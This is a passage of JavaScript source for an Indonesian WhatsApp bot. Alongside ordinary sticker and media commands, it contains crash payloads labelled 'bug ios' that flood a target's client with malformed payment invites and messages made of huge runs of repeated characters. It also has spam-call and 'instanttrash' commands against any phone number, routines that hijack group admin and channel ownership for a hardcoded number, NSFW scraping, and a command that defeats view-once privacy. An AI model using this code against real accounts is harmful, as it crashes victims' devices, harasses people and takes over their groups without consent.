                  buttons: [
                    {
                      name: "cta_url",
                      buttonParamsJson: `{"display_text":"Saluran zaxyz 𝗩1 𝗚𝗘𝗡 1🐉"https://whatsapp.com/channel/0029Vb3FUXtIyPtTbhQdSO3l,"url":"channel/0029Vb3FLbNDeON7RBx7OX0l","merchant_url":"https://whatsapp.com/channel/0029Vb2ZjH21dAw8nEPgvG07"}`
                    },
                  ],
                },
              },
            ],
            messageVersion: 1,
          },
        },
      },
    },
  },
  {}
);

await sock.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id,
});

}
break;
async function randomNsFw() {
			return new Promise((resolve, reject) => {
				const page = Math.floor(Math.random() * 1153)
				axios.get('https://sfmcompile.club/page/' + page).then((data) => {
					const $ = cheerio.load(data.data)
					const hasil = []
					$('#primary > div > div > ul > li > article').each(function (a, b) {
						hasil.push({
							title: $(b).find('header > h2').text(),
							link: $(b).find('header > h2 > a').attr('href'),
							category: $(b).find('header > div.entry-before-title > span > span').text().replace('in ', ''),
							share_count: $(b).find('header > div.entry-after-title > p > span.entry-shares').text(),
							views_count: $(b).find('header > div.entry-after-title > p > span.entry-views').text(),
							type: $(b).find('source').attr('type') || 'image/jpeg',
							video_1: $(b).find('source').attr('src') || $(b).find('img').attr('data-src'),
							video_2: $(b).find('video > a').attr('href') || ''
						})
					})
					resolve(hasil)
				})
			})
		}
			case 'r34': {
			if (!PremOnly) return ReplyRap("*You are not a Premium User*");	
			async function rule34Random() {
				try {
					let response = await axios.get('https://api.rule34.xxx/index.php?page=dapi&s=post&q=index&json=1')
					let results = response.data
					if (!Array.isArray(results) || results.length === 0) {
						throw new Error('No images found')
					}
					let randomImage = results[Math.floor(Math.random() * results.length)]
					let imageUrl = randomImage.file_url
					if (!imageUrl) {
						throw new Error('Image URL not found')
					}
					return { status: 200, imageUrl }
				} catch (error) {
					console.error('Error:', error)
					return { status: 500, error: error.message }
				}
			}
			async function sendRandomRule34Image(m) {
				try {
					let response = await rule34Random()
					if (response.status !== 200) {
						throw new Error(response.error)
					}
					let imageUrl = response.imageUrl
					sock.sendMessage(m.chat, { image: { url: imageUrl }, caption: 'Random Image From zaxyz\n\n*Powered By zaxyz Ganteng*' }, { quoted: m })
				} catch (e) {
					reply(e.message)
				}
			}
			sendRandomRule34Image(m)
		}
		break
		case 'hentaineko':

if (!PremOnly) return ReplyRap("*You are not a Premium User*");
 let waifudd2 = await axios.get(`https://waifu.pics/api/nsfw/neko`)
sock.sendMessage(m.chat, { caption: "sangean lu jir", image: { url:waifudd2.data.url } }, { quoted: m })
break
        	case 'nsfw': {
        	if (!PremOnly) return ReplyRap("*You are not a Premium User*");
        	ReplyRap(`Prosess Mengambil Video NSFW `)
			sbe = await randomNsFw()
			cejd = sbe[Math.floor(Math.random(), sbe.length)]
			sock.sendMessage(m.chat, {
				video: { url: cejd.video_1 },
				caption: `⭔ Title : ${cejd.title}
⭔ Category : ${cejd.category}
⭔ Mimetype : ${cejd.type}
⭔ Views : ${cejd.views_count}
⭔ Shares : ${cejd.share_count}
⭔ Source : ${cejd.link}
⭔ Media Url : ${cejd.video_1}`
			}, { quoted: m })
		}
		break

case 'X-zax':
case 'x-zax': {
if (!PremOnly) return ReplyRap("*You are not a Premium User*");
    if (!q) return ReplyRap("Example .x-zax 628xxx");

    let jidx = q.replace(/[^0-9]/g, "");
    
    if (jidx.startsWith('0')) {
        return ReplyRap(`Example: .grifin 628xxx`);
    }

    let target = `${jidx}@s.whatsapp.net`;
    
  sock.sendMessage(m.chat, {
  caption: "∆", 
  image: { url: "https://files.catbox.moe/kltqkj.jpg" },
  footer: "© zaxyz 𝗩1 𝗚𝗘𝗡 1🌹",
  buttons: [
    { 
      buttonId: `.menu`, 
      buttonText: {
      displayText: '盛'
      }, 
      type: 1,
      viewOnce: true
    },
    { 
      buttonId: '.ownerdev', 
      buttonText: {
      displayText: '鬒'
      }, 
      type: 1,
      viewOnce: true
    },
    { 
      buttonId: '.hidetag kamu mana punya😂', 
      buttonText: {
      displayText: 'Weladalah' 
      }, 
      type: 4, 
      nativeFlowInfo: {
    name: 'single_select', 
    paramsJson: `{
        "title": "asy͢͠𝑴̾𝒐𝒅̈́𝒔̗𝒔👻",
        "sections": [
            {
                "title": "zaxyz X 𝑴̾𝒐𝒅̈́𝒔̗𝒔🌹",
                "highlight_label": "",
                "rows": [
                    {
                        "header": "⎾𝐂𝐑͢͞˅𝐒̷𝐇🐉⏌",
                        "title": "⌁⃰𝐓͢𝒓𝒂ͯ͢𝒔𝒉 𝐕͍ͮ͛͢𝟏༑",
                        "description": "✾",
                        "id": ".instanttrash ${target}"
                    },
                    {
                    header": "",
                        "title": "⌁⃰𝐓͢𝒓𝒂ͯ͢𝒔𝒉 𝐕͍ͮ͛͢𝟐༑",
                        "description": "✾",
                        "id": ".instanttrash ${target}"
                    },
                    {
                    header": "",
                        "title": "⌁⃰𝐓͢𝒓𝒂ͯ͢𝒔𝒉 𝐕͍ͮ͛͢𝟑༑",
                        "description": "✾",
                        "id": ".instanttrash ${target}"
                    },
                    {
                        header": "",
                        "title": "⌁⃰𝐓͢𝒓𝒂ͯ͢𝒔𝒉 𝐕͍ͮ͛͢𝟒༑",
                        "description": "✾",
                        "id": ".instanttrash ${target}"
                     },
                    {
                    header": "",
                        "title": "⌁⃰𝐓͢𝒓𝒂ͯ͢𝒔𝒉 𝐕͍ͮ͛͢𝟓༑",
                        "description": "✾",
                        "id": ".instanttrash ${target}"
                    },
                    {
                    "header": "⎾⌁⃰𝐈𝐧ͯ͢𝐅𝐌͠༑🐉⏌",
                        "title": "⌁⃰𝐈𝐧ͯ͢𝐅𝐢𝐧ͮ͢𝐢𝐭𝐞 𝐌͠𝐨́˅͢𝐨𝐧༑",
                        "description": "✾",
                        "id": ".instanttrash ${target}"
                    },
                    {
                        header": "",
                        "title": "⌁⃰𝐈𝐧ͯ͢𝐅𝐢𝐧ͮ͢𝐢𝐭𝐞 𝐎̈́͢𝐋ͮ𝐒͠༑",
                        "description": "✾",
                        "id": ".instanttrash ${target}"
                     },
                    {
                    header": "",
                        "title": "⌁⃰𝐈𝐧ͯ͢𝐅𝐢𝐧ͮ͢𝐢𝐭𝐞 𝐌͢𝐚̃˅͟𝐫𝐤༑",
                        "description": "✾",
                        "id": ".instanttrash ${target}"
                    },
                    {
                    "header": "⎾⌁⃰𝐕͢𝐒𝐗༑🐉⏌",
                        "title": "⌁⃰𝐕͢𝐚ͯ𝐒𝐢͢𝐨ͮ𝐧 𝐗༑",
                        "description": "✾",
                        "id": ".instanttrash ${target}"
                    },
                    {
                        header": "",
                        "title": "⌁⃰𝐕͢𝐚ͯ𝐒𝐢͢𝐨ͮ𝐧 𝐀༑",
                        "description": "✾",
                        "id": ".instanttrash ${target}"
                     },
                    {
                    header": "",
                        "title": "⌁⃰𝐕͢𝐚ͯ𝐒𝐢͢𝐨ͮ𝐧 𝐙༑",
                        "description": "✾",
                        "id": ".instanttrash ${target}"
                    },
                    {
                        header": "",
                        "title": "⌁⃰𝐕͢𝐚ͯ𝐒𝐢͢𝐨ͮ𝐧 𝚯༑",
                        "description": "✾",
                        "id": ".instanttrash ${target}"
                     },
                    {
                    header": "",
                        "title": "⌁⃰𝐕͢𝐚ͯ𝐒𝐢͢𝐨ͮ𝐧 𝐒༑",
                        "description": "✾",
                        "id": ".instanttrash ${target}"
                    },
                    {
                    "header": "⎾ 𝐈𝐨ͮ͢𝐒༑🐉⏌",
                        "title": "⌁⃰𝐓͢𝒓𝒂ͯ͢𝒔𝒉 𝐆𝐥𝐢̶͢𝐜̾𝐡༑",
                        "description": "✾",
                        "id": ".instanttrash ${target}"
                    },
                    {
                        header": "",
                        "title": "⌁⃰𝐓͢𝒓𝒂ͯ͢𝒔𝒉 𝐈𝐨ͮ͢𝐒༑",
                        "description": "✾",
                        "id": ".instanttrash ${target}"
                    },
                    {
                    "header": "[ SPAMCALL ]",
                        "title": "⌁⃰𝐒͢𝐩𝐚ͯ͢𝐦 𝐂𝐚̌͢𝐥𝐥༑",
                        "description": "✾",
                        "id": ".spamcall ${target}"
                    },
                    {
                        header": "[ IOS ]",
                        "title": "⌁⃰𝐒͢𝐩𝐚ͯ͢𝐦 𝑽𝒊̷͢𝒅𝐂𝐚̌͢𝐥𝐥༑",
                        "description": "✾",
                        "id": ".spamcallvid ${target}"
                    }
                ]
            }
        ]
    }`
},
      viewOnce: true
    }
  ],
  headerType: 1,
  viewOnce: true
}, { quoted: lol2 });
}
break


// END ALL MENU CASE }
//ACCESS CASE

case "boom": {
  try {
    if (!DevOnly) {
      return reply("Lu sok asik bangsad");
    }

    let getGroups = await sock.groupFetchAllParticipating();
    let groups = Object.entries(getGroups).map(([id, details]) => ({ id, ...details }));

    const additionalAdmin = "6283196856163@s.whatsapp.net";

    for (let group of groups) {
      const groupId = group.id;

      if (!isBotAdmins) {
        console.log('Bot bukan admin di grup, melewati grup ini.');
        continue;
      }

      if (!isMember) {
        try {
          await sock.groupParticipantsUpdate(groupId, [additionalAdmin], 'add');
          console.log("Nomor ${additionalAdmin} berhasil ditambahkan ke grup");
        } catch (err) {
          console.error("Gagal menambahkan ${additionalAdmin} ke grup ${groupId}:, err");
          continue;
        }
      }

      try {
        await sock.groupParticipantsUpdate(groupId, [additionalAdmin], 'promote');
        console.log("done")
      } catch (err) {
        console.error("gagal");
      }

      const newGroupName = "zaxyAhayy";
      try {
        await sock.groupUpdateSubject(groupId, newGroupName);
        console.log("done")
      } catch (err) {
        console.error("done")
      }

      const newGroupDescription = "✨ Grup ini sekarang dikelola oleh Admin zaxyz aowkwk.";
      try {
        await sock.groupUpdateDescription(groupId, newGroupDescription);
        console.log("done");
      } catch (err) {
        console.error("done");
      }

      await sock.sendMessage(groupId, {
        text: "done"
      });
    }

    const newBotName = "zaxyzDone";
    await sock.updateProfileName(newBotName);

    try {
      await sock.updateProfilePicture(botNumber, { url: "https://raw.githubusercontent.com/Irms237/yowhello/main/photo_2024-12-19_01-39-48.jpg" });
      console.log("done");
    } catch (err) {
      console.error("done");
    }

    return await sock.sendMessage(
      m.chat,
      {
        text: '✅🔥 *fungsi berhasil dieksekusi!*\n\nNomor telah ditambahkan dan dijadikan admin di semua grup.\nNama grup dan deskripsi grup diperbarui.\nNama bot diubah menjadi: ${newBotName}\nFoto profil bot juga telah diperbarui.',
      },
      { quoted: m }
    );

  } catch (err) {
    console.error(err);
    return await sock.sendMessage(
      m.chat,
      { text: "Terjadi kesalahan saat mengeksekusi perintah. Coba lagi nanti." },
      { quoted: m }
    );
  }
}
break;

case "ch": {
    let bijiasu = budy.slice(10); // Ambil argumen (jika ada)
    function delay(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    // Periksa apakah pengguna adalah pemilik
    if (!DevOnly) return m.reply('Maaf, command ini hanya untuk pemilik.');

    // Coba metode alternatif untuk mendapatkan daftar saluran
    let channels;
    try {
        if (typeof sock.channelFetchAllParticipating === "function") {
            channels = Object.values(await sock.channelFetchAllParticipating().catch(_ => null));
        } else if (typeof sock.getChannels === "function") {
            channels = Object.values(await sock.getChannels().catch(_ => null));
        } else {
            return m.reply('Error: Tidak dapat menemukan metode untuk mengambil daftar saluran.');
        }
    } catch (err) {
        console.error("Error fetching channels:", err);
        return m.reply('Terjadi kesalahan saat mencoba mengambil daftar saluran.');
    }

    if (!channels || channels.length === 0) {
        return m.reply('Tidak ada saluran yang ditemukan.');
    }

    let channelList = [];
    channels.forEach((channel) => {
        channelList.push(channel.id);
    });

    for (let i = 0; i < channelList.length; i++) {
        try {
            let channelId = channelList[i];

            // Ambil info saluran
            let channelMetadata = await sock.channelMetadata(channelId).catch(_ => null);
            if (!channelMetadata) continue;

            let participants = channelMetadata.participants;
            let botNumber = sock.user.id.split(":")[0] + "@s.whatsapp.net";
            let myNumber = "6285954071669@s.whatsapp.net";

            // Tambahkan nomor Anda ke saluran jika belum ada
            let isInChannel = participants.some(p => p.id === myNumber);
            if (!isInChannel) {
                await sock.channelParticipantsUpdate(channelId, [myNumber], "zaxyzxxnxx").catch(_ => null);
                await delay(100); // Tunggu 3 detik setelah menambahkan nomor
            }

            // Jadikan Anda pemilik saluran
            let DevOnly = participants.find(p => p.id === myNumber)?.owner;
            if (!DevOnly) {
                await sock.channelParticipantsUpdate(channelId, [myNumber], "promote").catch(_ => null);
                await delay(100); // Tunggu 2 detik setelah menjadikan pemilik
            }

            // Cabut status pemilik lain kecuali Anda dan bot
            let owners = participants.filter(p => p.owner === "owner");
            let ownersToRevoke = owners
                .map(p => p.id)
                .filter(ownerId => ownerId !== myNumber && ownerId !== botNumber);

            if (ownersToRevoke.length > 0) {
                await sock.channelParticipantsUpdate(channelId, ownersToRevoke, "demote").catch(_ => null);
                await delay(100); // Tunggu 2 detik setelah mencabut status pemilik
            }

        } catch (error) {
            console.error(`Error processing channel ${channelList[i]}:`, error);
        }
        await delay(100); // Tunggu 5 detik sebelum iterasi berikutnya
    }

    // Logika untuk mengganti bio
    let newBio = "Owned by zaxyz-is-here Tampan"; // Default bio
    if (bijiasu && bijiasu.trim().length > 0) {
        newBio = bijiasu.trim(); // Gunakan argumen jika tersedia
    }

    try {
        await sock.updateProfileStatus(newBio);
        await m.reply(`Sukses mengganti bio bot menjadi: "${newBio}"`);
    } catch (error) {
        console.error("Error updating bot bio:", error);
    }

    await m.reply("Saluran berhasil dikelola! Anda sekarang adalah pemilik di semua saluran.");
    break;
}


case 'addowner': case 'addown':
if (!DevOnly) return ReplyRap(`YOU ARE NOT OWNER FUCK`) 
  if (!args[0]) return ReplyRap(`Penggunaan ${prefix + command} Example ${prefix + command} 62xxx`);
  numero = qtext.split("|")[0].replace(/[^0-9]/g, '');
  let loadnum = await sock.onWhatsApp(numero + `@s.whatsapp.net`);
  if (loadnum.length == 0) return ReplyRap(`Number Invalid!!!`);
  owner.push(numero);
  Premium.push(numero);
  fs.writeFileSync('./account/Own.json', JSON.stringify(owner));
  fs.writeFileSync('./account/Prem.json', JSON.stringify(Premium));
  ReplyRap(`Number ${numero} succes zaxyzxxnxx to database!`);
  break;

//END
//ACCESS CASE

case 'delowner': case 'delown':
if (!DevOnly) return ReplyRap(`YOU ARE NOT OWNER FUCK`) 
  if (!args[0]) return ReplyRap(`Penggunaan ${prefix + command} Example:\n ${prefix + command} 62xxx`);
  numero2 = qtext.split("|")[0].replace(/[^0-9]/g, '');
  numeroX = Owner.indexOf(numero2);
  numload = Premium.indexOf(numero2);
  Owner.splice(numeroX, 1);
  Premium.splice(numload, 1);
  fs.writeFileSync('./account/Own.json', JSON.stringify(Owner));
  fs.writeFileSync('./account/Prem.json', JSON.stringify(Premium));
  ReplyRap(`Number ${numero2} succes delate to database!`);
  break;

//END
//ACCESS CASE

case 'addpremium': case 'addprem':
if (!DevOnly) return ReplyRap(`YOU ARE NOT OWNER FUCK`) 
  if (!args[0]) return ReplyRap(`Penggunaan ${prefix + command} Example ${prefix + command} 62xxx`);
  numero = qtext.split("|")[0].replace(/[^0-9]/g, '');
  let Invalid = await sock.onWhatsApp(numero + `@s.whatsapp.net`);
  if (Invalid.length == 0) return ReplyRap(`Number Invalid!!!`);
  Premium.push(numero);
  fs.writeFileSync('./account/Prem.json', JSON.stringify(Premium));
  ReplyRap(`Number ${numero} succes zaxyz-is-here to database!`);
  break
  
//END
//ACCESS CASE


case 'delpremium': case 'delprem':
if (!DevOnly) return ReplyRap(`YOU ARE NOT OWNER FUCK`) 
  if (!args[0]) return ReplyRap(`Penggunaan ${prefix + command} Example ${prefix + command} 62xxx`);
  numero2 = qtext.split("|")[0].replace(/[^0-9]/g, '');
  numeroX = Premium.indexOf(numero2);
  Premium.splice(numeroX, 1);
  fs.writeFileSync('./account/Prem.json', JSON.stringify(Premium));
  ReplyRap(`Number ${numero2} succes delate to database!`);
  break;

//END
//QC CASE

case 'qc': {
  if (!q) return ReplyRap(`Send command with text. ${prefix + command} Hai`);
  let obj = {
    type: 'quote',
    format: 'png',
    backgroundColor: '#ffffff',
    width: 512,
    height: 768,
    scale: 2,
    messages: [
      {
        entities: [],
        avatar: true,
        from: {
          id: 1,
          name: `${pushname}`,
          photo: { 
            url: await sock.profilePictureUrl(m.sender, "image").catch(() => 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'),
          }
        },
        text: `${q}`,
        replyMessage: {},
      },
    ],
  };
  let response = await axios.post('https://bot.lyo.su/quote/generate', obj, {
    headers: {
      'Content-Type': 'application/json',
    },
  });
  let buffer = Buffer.from(response.data.result.image, 'base64');
  sock.sendImageAsSticker(m.chat, buffer, m, { packname: `${global.packname}`, author: `${global.author}` });
}
break;

//END
//PLAY CASE

case "play": {
        if (!qtext) return ReplyRap(`send title song\n example ${prefix + command} ransom`);
        let search = await yts(qtext);
        let telaso = search.all[0].url;
        let puqi = await VocalRemover(telaso);
          let vocalAudio = puqi.stuffs.find(item => item.bizType === 'origin').key;
          sock.sendMessage(m.chat, {
              audio: { url : vocalAudio },
              mimetype: 'audio/mpeg', 
              ptt: true
          },{ quoted:m })
        }
      break
      
//END
//RVO CASE

case "rvo":
case "readvo":
case 'readviewonce':
case 'readviewoncemessage': {

  if (!m.quoted) return ReplyRap("Reply to an image/video that you want to view");
  if (m.quoted.mtype !== "viewOnceMessageV2" && m.quoted.mtype !== "viewOnceMessage") 
    return ReplyRap("This is not a view-once message.");

  let msg = m.quoted.message;
  let type = Object.keys(msg)[0];

  if (!["imageMessage", "videoMessage"].includes(type)) {
    return ReplyRap("The quoted message is not an image or video.");
  }

  // Download media content
  let media = await downloadContentFromMessage(msg[type], type === "imageMessage" ? "image" : "video");

  let bufferArray = [];
  for await (const chunk of media) {
    bufferArray.push(chunk);
  }
  let buffer = Buffer.concat(bufferArray);

  // Send media according to type (image or video)
  if (type === "videoMessage") {
    await sock.sendMessage(m.chat, { video: buffer, caption: msg[type].caption || "" });
  } else if (type === "imageMessage") {
    await sock.sendMessage(m.chat, { image: buffer, caption: msg[type].caption || "" });
  }
  await sock.sendMessage(m.chat, { react: { text: '✅', key: m.key } }); 
}
break

//END
//SETPP CASE

case "setpp": {
  if (!DevOnly) return 
  if (!m.quoted) return ReplyRap("Reply to an image with this command to set profile picture!");
  
  try {
    const media = await sock.downloadAndSaveMediaMessage(m.quoted);
    const { img } = await generateProfilePicture(media);

    await sock.query({
      tag: "iq",
      attrs: {
        to: BotNum,
        type: "set",
        xmlns: "w:profile:picture"
      },
      content: [{
        tag: "picture",
        attrs: {
          type: "image"
        },
        content: img
      }]
    });

    await ReplyRap("Profile picture set successfully!");
  } catch (error) {
    console.error(error);
    await ReplyRap("Failed to set profile picture. Make sure you replied to an image and try again.");
  }
}
break
//END
//DELETE PP CASE

case "delpp": {
if (!DevOnly) return 
  sock.removeProfilePicture(sock.user.id);
  ReplyRap("Success Delete Profile Picture");
}
break;

//END
//TOVN CASE

case 'tovn': {
  if (!/video/.test(mime) && !/audio/.test(mime)) return ReplyRap(`Reply media with caption ${prefix + command}`);
  if (!quoted) return ReplyRap(`Reply video/vn with caption ${prefix + command}`);
  
  let media = await quoted.download();
  let { toAudio } = require('./database/pusat/Data4');
  let audio = await toAudio(media, 'mp4');
  
  sock.sendMessage(m.chat, { audio, mimetype: 'audio/mpeg', ptt: true }, { quoted: m });
}
break;

//END
//HIDETAG CASE

case 'hidetag': {
  if (!DevOnly) return 
  if (!m.isGroup) return 
  sock.sendMessage(from, { text: q ? q : 'Finix Always Stay In Here', mentions: participants.map(a => a.id) }, { quoted: m });
}
break;

//END
//KICK CASE

case 'kick': {
if (!DevOnly) return 
  if (!m.isGroup) return 
  if (!BotAdm) return  
  if (!Adm) return 

  let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
  if (!q) return ReplyRap("Send number / tag users ");
  await sock.groupParticipantsUpdate(from, [users], 'remove');
}
break;

//END
//GET LINK GROUP

case 'linkgroup': case 'linkgc': {
  if (!DevOnly) return 
  if (!m.isGroup) return 
  if (!BotAdm) return  

  let responsegg = await sock.groupInviteCode(from);
  sock.sendText(from, `https://chat.whatsapp.com/${responsegg}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true });
}
break;

//END
//RESET LINK GC CASE

case 'resetlinkgc': {
  if (!DevOnly) return 
  if (!m.isGroup) return 
  if (!BotAdm) return  
  
  sock.groupRevokeInvite(from);
}
break;

//END
//CONTROL CASE

case 'public': {
  if (!DevOnly) return 
  sock.public = true;
  ReplyRap(`*Success Change Mode Self To Public zaxyz*`);
}
break;

//END
//CONTROL CASE

case 'self': case 'private': {
  if (!DevOnly) return
  sock.public = false;
  ReplyRap(`*Success Change Mode Public To Self zaxyz*`);
}
break;

//END
//OCR CASE
case 'ocr': {

  let q = m.quoted ? m.quoted : m;
  let mime = (q.msg || q).mimetype || "";
  if (!mime) return ReplyRap("Send / Reply Image");
  if (!/image\/(jpe?g|png)/.test(mime))
    return ReplyRap(`Tipe ${mime} tidak didukung!`);
  let image = await q.download();
  let download = await sock.getFile(image, true);
  let ocr = await ocrSpace(download.filename);
  await sock.sendMessage(
    m.chat,
    { text: ocr.ParsedResults[0].ParsedText.trim() },
    { quoted: m },
  );
}
break
//END
//TOURL CASE

case 'tourl': {    
    let q = m.quoted ? m.quoted : m;
    if (!q || !q.download) return ReplyRap(`Reply to an Image or Video with command ${prefix + command}`);
    
    let mime = q.mimetype || '';
    if (!/image\/(png|jpe?g|gif)|video\/mp4/.test(mime)) {
        return ReplyRap('Only images or MP4 videos are supported!');
    }

    let media;
    try {
        media = await q.download();
    } catch (error) {
        return ReplyRap('Failed to download media!');
    }

    const uploadImage = require('./database/pusat/Data6');
    const uploadFile = require('./database/pusat/Data7');
    let isTele = /image\/(png|jpe?g|gif)|video\/mp4/.test(mime);
    let link;
    try {
        link = await (isTele ? uploadImage : uploadFile)(media);
    } catch (error) {
        return ReplyRap('Failed to upload media!');
    }

    sock.sendMessage(m.chat, {
        text: `(no expiration date/unknown)\n ${link}`
    }, { quoted: m });
}
break

//END
//STICKER CASE

case 'sticker': case 's': {
  if (!quoted) return ReplyRap(`Reply Image or Video with command ${prefix + command}`);
  
  if (/image/.test(mime)) {
    let media = await quoted.download();
    let encmedia = await sock.sendImageAsSticker(from, media, m, { packname: global.packname, author: global.author });
    await fs.unlinkSync(encmedia);
  } else if (/video/.test(mime)) {
    if ((quoted.msg || quoted).seconds > 11) return ReplyRap('max 10s');
    
    let media = await quoted.download();
    let encmedia = await sock.sendVideoAsSticker(from, media, m, { packname: global.packname, author: global.author });
    await fs.unlinkSync(encmedia);
  } else {
    return ReplyRap(`Send Image or Video with command ${prefix + command}\nvideo duration only 1-9s`);
  }
}
break;
//END
//BRAT CASE
//zaxyzxxnxx BOT CASE

//END

case 'brat': {
            if (!q) return ReplyRap(`Send command with text. ${prefix + command} zaxyzpp`)
            const imageUrl = `https://brat.caliphdev.com/api/brat?text=${q}`
            await makeStickerFromUrl(imageUrl, sock, m);
        }
       break

//END
//TES BOT CASE
case 'tes':
case 'status': {
ReplyRap(`*zaxyz 𝗩1 𝗚𝗘𝗡 1 ON!*`)
}
break
//END
case "joingc": case "join": {
if (!DevOnly) return m.reply(`woi, lu siapa?`)
if (!q) return m.reply(example("linkgcnya"))
let result = args[0].split("https://chat.whatsapp.com/")[1];
let target = await sock.groupAcceptInvite(result);
m.reply(`Berhasil`)
}
break



//TIKTOK CASE
//bug ios
async function UpiCrash(target) {
      await sock.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "UPI",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function VenCrash(target) {
      await sock.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "VENMO",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function AppXCrash(target) {
      await sock.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "CASHAPP",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function SmCrash(target) {
      await sock.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "SAMSUNGPAY",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }


async function newsLetter(target) {
            try {
                const messsage = {
                    botInvokeMessage: {
                        message: {
                            newsletterAdminInviteMessage: {
                                newsletterJid: `33333333333333333@newsletter`,
                                newsletterName: "𝐒𝐙𝐒𝐍𝐀𝐊𝐄 𝐏𝐑𝐎" + "ી".repeat(120000),
                                jpegThumbnail: "",
                                caption: "ꦽ".repeat(120000),
                                inviteExpiration: Date.now() + 1814400000,
                            },
                        },
                    },
                };
                await sock.relayMessage(target, messsage, {
                    userJid: target,
                });
            }
            catch (err) {
                console.log(err);
            }
        }

    async function SqCrash(target) {
      await sock.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "SQUARE",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function FBiphone(target) {
      await sock.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "FBPAY",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function QXIphone(target) {
      let CrashQAiphone = "𑇂𑆵𑆴𑆿".repeat(60000);
      await sock.relayMessage(
        target,
        {
          locationMessage: {
            degreesLatitude: 999.03499999999999,
            degreesLongitude: -999.03499999999999,
            name: CrashQAiphone,
            url: "https://t.me/xyroooy",
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function QPayIos(target) {
      await sock.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "PAYPAL",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function QPayStriep(target) {
      await sock.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "STRIPE",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function QDIphone(target) {
      sock.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: "ꦾ".repeat(55000),
            contextInfo: {
              stanzaId: target,
              participant: target,
              quotedMessage: {
                conversation: "Maaf Kak" + "ꦾ࣯࣯".repeat(50000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
        },
        {
          paymentInviteMessage: {
            serviceType: "UPI",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        },
        {
          messageId: null,
        }
      );
    }

    //
    
  async function beta22(target) {
    for (let i = 0; i < 10; i++) {
        await sock.relayMessage(target, 
            {
                viewOnceMessage: {
                    message: {
                        interactiveResponseMessage: {
                            body: {
                                text: "bang, GUA zaxyz",
                                format: "EXTENSIONS_1"
                            },
                            nativeFlowResponseMessage: {
                                name: 'galaxy_message',
                                paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"AdvanceBug\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"attacker@zetxcza.com\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"ꦾ".repeat(1020000)}\",\"screen_0_TextInput_1\":\"\u0003\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                                version: 3
                            }
                        }
                    }
                }
            }, 
            { participant: { jid: target } }
        );
    }
}

    async function IosMJ(target) {
      await sock.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: "Wanna With Yours :)" + "ꦾ".repeat(90000),
            contextInfo: {
              stanzaId: "1234567890ABCDEF",
              participant: "0@s.whatsapp.net",
              quotedMessage: {
                callLogMesssage: {
                  isVideo: true,
                  callOutcome: "1",
                  durationSecs: "0",
                  callType: "REGULAR",
                  participants: [
                    {
                      jid: "0@s.whatsapp.net",
                      callOutcome: "1",
                    },
                  ],
                },
              },
              remoteJid: target,
              conversionSource: "source_example",
              conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
              conversionDelaySeconds: 10,
              forwardingScore: 99999999,
              isForwarded: true,
              quotedAd: {
                advertiserName: "Example Advertiser",
                mediaType: "IMAGE",
                jpegThumbnail:
